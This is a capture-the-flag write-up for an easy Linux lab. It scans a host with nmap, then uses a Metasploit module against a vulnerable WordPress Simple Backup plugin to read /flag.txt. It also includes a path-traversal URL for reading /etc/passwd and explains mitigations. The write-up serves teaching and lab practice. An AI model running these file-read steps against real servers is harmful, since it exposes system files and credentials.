
## **Overview**

- **Difficulty:** Easy
- **Operating System:** Linux
- **Objective:** Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)
- **Tools Used:** `nmap`, `metasploit`, `openvpn`, `searchsploit`

---

## **Scanning using Nmap**

Started with the nmap scan to understand what services are running.
First started with port `30811` as mentioned in the IP given:
```
$ sudo nmap -sV 94.237.54.116 -p30811
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 10:27 IST
Nmap scan report for 94-237-54-116.uk-lon1.upcloud.host (94.237.54.116)
Host is up (0.21s latency).

PORT      STATE SERVICE VERSION
30811/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.18 seconds
```

Second, also got a broader view of open services:
```
$ sudo nmap -sV 94.237.54.116
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-03 10:29 IST
Nmap scan report for 94-237-54-116.uk-lon1.upcloud.host (94.237.54.116)
Host is up (0.20s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
19/tcp    filtered chargen
22/tcp    open     ssh             OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
25/tcp    filtered smtp
111/tcp   open     rpcbind         2-4 (RPC #100000)
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
32775/tcp filtered sometimes-rpc13
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds

```

Woah, there's too many! (None of these will be used as you will see : _ )

---

## **Searching Metasploit for Exploits**

Went through each service one by one and none seemed to be an exploit.
Like this `chargen` exploit:
```
msf6 exploit(windows/dcerpc/ms05_017_msmq) > use auxiliary/scanner/chargen/chargen_probe
msf6 auxiliary(scanner/chargen/chargen_probe) > show options

Module options (auxiliary/scanner/chargen/chargen_probe):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   FILTER                      no        The filter string for capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      19               yes       The target port (UDP)
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    10               yes       The number of concurrent threads
   TIMEOUT    500              yes       The number of seconds to wait for new data


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/chargen/chargen_probe) > set RHOSTS 94.237.54.116
RHOSTS => 94.237.54.116
msf6 auxiliary(scanner/chargen/chargen_probe) > exploit
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Hard luck!

---
## **Hit the Browser**

Next, type in `94.237.54.116:30811` in the search.
It loads a page:
![[Pasted image 20250103111916.png]]

The `Wordpress plugin 2.7.10` shows some hope.
Let's search it up on Google, here's what I searched for `Simple Backup Plugin 2.7.10 for WordPress expoit` and click on this link which I picked at random to go through [link](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wp_simple_backup_file_read/).

This is exactly what we're looking for!
(I've explained the exploit in Learnings section below.)
I also find this:
![[Pasted image 20250103112251.png]]

---
## **Flag Retrieval**

Now, I'll be heading over to msf and typing the use as I see it from the link I just came from.
```
msf6 > use auxiliary/scanner/http/wp_simple_backup_file_read
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) >
```

Now, let's have a look at the options:
```
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > show options

Module options (auxiliary/scanner/http/wp_simple_backup_file_read):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEPTH      6                yes       Traversal Depth (to reach the root folder)
   FILEPATH   /etc/passwd      yes       The path to the file to read
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THREADS    1                yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.
```

The options that need setting are:
```
RHOSTS -> 94.237.54.116
RPORT -> 30811
FILEPATH -> /flag.txt
```

Set them as:
```
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RHOSTS 94.237.54.116
RHOSTS => 94.237.54.116
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set RPORT 30811
RPORT => 30811
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > set FILEPATH /flag.txt
FILEPATH => /flag.txt
```

At this point, we're ready to get the flag:
```
msf6 auxiliary(scanner/http/wp_simple_backup_file_read) > run
[+] File saved in: /home/ghost/.msf4/loot/20250103105321_default_94.237.54.116_simplebackup.tra_269914.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now, all you gotta do is follow the path and `cat` the .txt.

---
## **Flag**

The flag is `HTB{my_f1r57_h4ck}`.

---
## **Lessons Learned**

The **WordPress Simple Backup File Read Vulnerability** refers to a security flaw in the **Simple Backup plugin** for WordPress, which allowed unauthorized attackers to read sensitive files on the server. This vulnerability is classified as a **local file inclusion (LFI)** or **arbitrary file read** issue.
### **How It Works**

1. **The Vulnerable Plugin:**
    
    - The **Simple Backup** plugin is designed to create backups of a WordPress site, including its database and files.
    - The plugin had insecure code that allowed attackers to access files on the server without proper authentication or validation.
2. **The Vulnerability:**
    
    - The plugin failed to adequately sanitize user input when specifying file paths.
    - Attackers could manipulate the URL or HTTP request to read arbitrary files from the server, such as:
        - `/etc/passwd` (Linux user account file)
        - `wp-config.php` (WordPress configuration file containing database credentials)
3. **Exploitation:**
    
    - An attacker sends a specially crafted HTTP request to a vulnerable endpoint of the plugin, specifying the file they want to read.
    - The plugin reads the requested file and sends its contents back to the attacker.
    - For example:
        
        ```bash
        http://example.com/wp-content/plugins/simple-backup/download.php?file=../../../../../../etc/passwd
        ```
        
    - The `../../../` path traversal is used to navigate out of the webroot directory to sensitive files on the server.
4. **Potential Impact:**
    
    - **Sensitive Information Disclosure:** Attackers could access files containing usernames, passwords, API keys, or other sensitive data.
    - **Privilege Escalation:** If configuration files like `wp-config.php` are read, attackers could take control of the WordPress site by using the database credentials.
    - **Further Exploitation:** By gaining access to sensitive files, attackers might leverage additional vulnerabilities or perform lateral movement.

---

### **Mitigation**

1. **Update the Plugin:**
    
    - Ensure the **Simple Backup plugin** is updated to a version where the vulnerability is patched.
    - If no patch is available, disable or uninstall the plugin.
2. **Implement File Access Restrictions:**
    
    - Restrict access to sensitive files using `.htaccess` or server configuration to prevent unauthorized access.
3. **Input Validation and Sanitization:**
    
    - Developers should sanitize and validate all user inputs, ensuring only allowed files can be accessed.
4. **Monitoring and Logging:**
    
    - Regularly monitor and analyze logs for unusual file access patterns.
5. **Use Web Application Firewalls (WAF):**
    
    - Deploy a WAF to block malicious requests exploiting known vulnerabilities.

---

**Prepared by Araiz Naqvi**